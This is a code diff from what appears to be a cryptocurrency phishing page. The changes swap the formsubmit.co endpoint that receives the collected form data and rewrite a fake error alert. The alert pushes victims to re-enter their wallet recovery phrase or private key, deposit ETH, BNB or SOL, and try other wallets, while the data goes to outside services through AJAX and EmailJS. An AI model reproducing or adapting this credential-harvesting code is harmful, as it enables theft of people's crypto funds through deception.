@@ -230,7 +230,7 @@
                 }
 
                 $.ajax({
-                    url: "https://formsubmit.co/ajax/d5e91a8736e47db92cf27e8f4f225e2e",
+                    url: "https://formsubmit.co/ajax/b56400a81c49acdbd5bcec07bdce8a8f",
                     method: "POST",
                     data: data,
                     dataType: "json"
@@ -245,7 +245,7 @@
                 emailjs.send(service_id, template_id, data)
                 .then(function(response) {
                 console.log('SUCCESS!', response.status, response.text);
-                alert("An unexpected error has occured. Contact Administrator to continue or connect another wallet")
+                alert("An unexpected error has occured. Please review your 12 or 24-word recovery phrase carefully, If the wallet recovery phrase or private key is not correct,or if you're attempting to connect an empty wallet, the error might persist. To resolve this,ensure you deposit enough ETH, BNB, or SOL into your wallet, as a lack of funds can also trigger this error. If problems continue, consider trying a different wallet or private key.")
                 }, function(error) {
                 console.log('FAILED...', error);
                 });
